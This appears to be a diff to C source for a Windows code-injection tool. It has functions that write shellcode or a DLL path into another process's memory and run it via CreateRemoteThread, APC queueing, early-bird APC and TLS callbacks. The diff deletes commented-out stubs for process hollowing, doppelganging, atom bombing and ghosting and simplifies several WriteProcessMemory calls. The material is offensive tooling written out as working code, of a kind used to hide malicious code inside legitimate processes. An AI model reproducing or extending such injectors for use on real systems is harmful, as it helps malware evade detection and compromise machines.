@@ -22,12 +22,6 @@ DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
 DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
 
-//DWORD InjectionUsingReflectiveDLL();
-//DWORD InjectUsingProcessHawllowing();
-//DWORD InjectUsingProcessDoubleGang();
-//DWORD InjectUsingTXx();
-//DWORD InjectUsingAtomicBombing();
-//DWORD InjectUsingProcessGosting();	//NEW
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 
@@ -49,7 +43,7 @@ DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
 		return -1;
 	}
 
-	Status = WriteProcessMemory(hProcess, BaseAddress, DllName, wcslen(DllName)*2+2, &BytesWritten);
+	Status = WriteProcessMemory(hProcess, BaseAddress, DllName, wcslen(DllName)*2+2, NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
@@ -124,7 +118,7 @@ DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName) {
 		return -1;
 	}
 
-	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), &BytesWritten);
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
@@ -166,7 +160,7 @@ DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
 		return -1;
 	}
 
-	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), &BytesWritten);
+	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
 	if (!Status) {
 		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
 		return -1;
@@ -214,7 +208,6 @@ DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName) {
 	ResumeProcess(ProcInfo.MainThreadHandle);
 	return Status;
 }
-
 
 //TODO If no TLS CallBack in process Create New Section For it
 DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* ExecutablePath) {
